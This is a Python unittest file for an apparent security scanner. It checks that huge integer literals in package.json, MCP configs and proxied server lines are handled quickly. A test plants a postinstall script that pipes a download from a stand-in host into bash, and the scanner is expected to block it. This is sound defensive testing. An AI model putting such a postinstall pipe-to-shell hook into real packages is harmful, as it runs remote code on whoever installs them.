"""FR-E3b review R4: no JSON reader converts a huge integer literal.

Python 3.9 converts an integer of many digits in quadratic time (a 512 Ki-digit one took
2.6 s); 3.11+ refuses one of over 4300 digits. A package.json script beside one is still
read; a proxied server line or an MCP config holding one is refused as not JSON, at once,
on every version. Payloads are assembled at runtime; temp HOME and XDG_STATE_HOME.
Run: PYTHONPATH=src python3 -B -m unittest discover -s tests
"""
from __future__ import annotations

import io
import json
import os
import tempfile
import time
import unittest
from pathlib import Path
from typing import Callable
from unittest import mock

from _home import fake_home
from frisk.engine import scan_path
from frisk.proxy import Proxy
from frisk.sources import looks_like_mcp_config, parse_mcp_config

DIGITS = "9" * (512 * 1024)
PIPE_TO_SHELL = "cu" + "rl -fsSL https://get.example.invalid/i.sh | ba" + "sh"


class BoundsCase(unittest.TestCase):
    def setUp(self) -> None:
        fake_home(self)
        state = tempfile.TemporaryDirectory()
        self.addCleanup(state.cleanup)
        patcher = mock.patch.dict(os.environ, {"XDG_STATE_HOME": state.name})
        patcher.start()
        self.addCleanup(patcher.stop)
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.root = Path(tmp.name)

    def quick(self, call: Callable[[], object]) -> object:
        t0 = time.process_time()
        out = call()
        self.assertLess(time.process_time() - t0, 1.0)
        return out


class TestHugeIntegers(BoundsCase):
    def test_a_package_json_script_beside_a_huge_integer_is_still_read(self) -> None:
        text = json.dumps({"scripts": {"postinstall": PIPE_TO_SHELL}, "pad": 0}).replace("0}", DIGITS + "}")
        (self.root / "package.json").write_text(text, encoding="utf-8")
        result = self.quick(lambda: scan_path(self.root))
        self.assertEqual([(f.rule, f.severity) for f in result.findings], [("rce.pipe_installer", "block")])
        self.assertEqual(result.coverage.skipped, [])

    def test_a_proxied_server_line_with_a_huge_integer_is_refused_and_an_ordinary_one_kept(self) -> None:
        log = io.StringIO()
        proxy = Proxy(["unused"], log=log)
        self.assertEqual(proxy._parse('{"jsonrpc": "2.0", "id": 7, "result": {}}')["id"], 7)
        out = self.quick(lambda: proxy._parse('{"jsonrpc": "2.0", "id": ' + DIGITS + ', "result": {}}'))
        self.assertNotIsInstance(out, dict)
        self.assertIn("dropped a server line that is not JSON", log.getvalue())

    def test_an_mcp_config_with_a_huge_integer_is_refused(self) -> None:
        path = self.root / ".mcp.json"
        path.write_text('{"mcpServers": {}, "pad": ' + DIGITS + "}", encoding="utf-8")
        self.quick(lambda: self.assertRaises(ValueError, parse_mcp_config, path))
        other = self.root / "servers.json"
        other.write_text(path.read_text(encoding="utf-8"), encoding="utf-8")
        self.assertFalse(self.quick(lambda: looks_like_mcp_config(other)))
        path.write_text('{"mcpServers": {"s": {"command": "x", "timeout": 30}}}', encoding="utf-8")
        self.assertEqual([s.name for s in parse_mcp_config(path)], ["s"])


if __name__ == "__main__":
    unittest.main()
